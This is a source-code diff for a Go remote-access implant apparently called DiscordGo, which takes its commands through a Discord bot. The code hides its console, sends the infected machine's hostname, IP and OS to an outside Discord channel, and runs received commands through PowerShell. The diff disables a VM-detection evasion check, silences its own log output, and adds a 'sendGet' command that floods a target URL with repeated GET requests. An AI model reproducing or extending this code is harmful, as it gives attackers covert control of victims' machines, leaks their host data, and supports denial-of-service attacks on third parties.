@@ -8,6 +8,7 @@ import (
 	"os/signal"
 	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -15,7 +16,6 @@ import (
 	"DiscordGo/pkg/agent"
 	"DiscordGo/pkg/util"
 
-	"github.com/ShellCode33/VM-Detection/vmdetect"
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -45,22 +45,23 @@ func HConsole() int {
 	return 0
 }
 
-func amVisor() bool {
-	result, _ := vmdetect.CommonChecks()
-	return result
-}
+// checksIfVM
+// func amVisor() bool {
+// 	result, _ := vmdetect.CommonChecks()
+// 	return result
+// }
 
 func main() {
 	HConsole()
-	if amVisor() {
-		os.Mkdir("FuckThis", 0777)
-		os.Exit(1)
-	}
+	// if amVisor() {
+	// 	os.Mkdir("FuckThis", 0777)
+	// 	os.Exit(1)
+	// }
 	util.GetKeys()
 	// TODO Do a check on the constant and produce a good error
 	dg, err := discordgo.New("Bot " + util.BotToken)
 	if err != nil {
-		fmt.Println("error creating Discord session,", err)
+		//fmt.Println("error creating Discord session,", err)
 		return
 	}
 
@@ -71,7 +72,7 @@ func main() {
 
 	sendMessage := "``` Hostname: " + newAgent.HostName + "\n IP:" + newAgent.IP + "\n OS:" + newAgent.OS + "```"
 	message, _ := dg.ChannelMessageSend(channelID.ID, sendMessage)
-	fmt.Print("[+]Host Info Sent !")
+	//fmt.Print("[+]Host Info Sent !")
 	dg.ChannelMessagePin(channelID.ID, message.ID)
 	dg.AddHandler(messageCreater)
 
@@ -152,6 +153,30 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 		if message.ChannelID == channelID.ID {
 			if message.Content == "ping" {
 				dg.ChannelMessageSend(message.ChannelID, "↑")
+			} else if strings.HasPrefix(message.Content, "sendGet") {
+				commandBreakdown := strings.Fields(message.Content)
+				if strings.Contains(commandBreakdown[1], "http") && len(commandBreakdown) == 3 { //If you supply a non int value program crashes. Handle that case later.
+					itterations, err := strconv.Atoi(commandBreakdown[2])
+					if err != nil {
+						os.Exit(1)
+					}
+					for i := 0; i < itterations; i++ {
+						code := util.SendGET(commandBreakdown[1])
+						if code != 200 {
+							dg.ChannelMessageSend(message.ChannelID, "[-]Exiting mode. Server returned: "+strconv.Itoa(code))
+							break
+						}
+						if message.ChannelID == channelID.ID {
+							if message.Content == "stop" {
+								dg.ChannelMessageSend(message.ChannelID, "[+]Closing the flood gates ...")
+								break
+							}
+						}
+						dg.ChannelMessageSend(message.ChannelID, "[*]Get Req Sent ...")
+					}
+				} else {
+					dg.ChannelMessageSend(message.ChannelID, "[-]Usage: http[:]//urltohit[.]xyz number of times to GET")
+				}
 			} else if message.Content == "kill" {
 				dg.ChannelDelete(channelID.ID)
 				os.Exit(0)
@@ -221,7 +246,7 @@ func messageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
 }
 
 func heartBeat(dg *discordgo.Session) {
-	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("❤️ %v ", newAgent.HostName, " ❤️ %v"))
+	dg.ChannelMessageSend(channelID.ID, fmt.Sprintf("❤️"))
 }
 
 func executeCommand(command string) string {
@@ -229,15 +254,6 @@ func executeCommand(command string) string {
 	result := ""
 	var shell, flag string
 	var testcmd = command
-	// Defualt
-	// if runtime.GOOS == "windows" {
-	// 	//shell = "cmd"
-	// 	shell = "powershell"
-	// 	flag = "/c"
-	// } else {
-	// 	shell = "/bin/sh"
-	// 	flag = "-c"
-	// }
 	shell = "powershell"
 	flag = "/c"
 
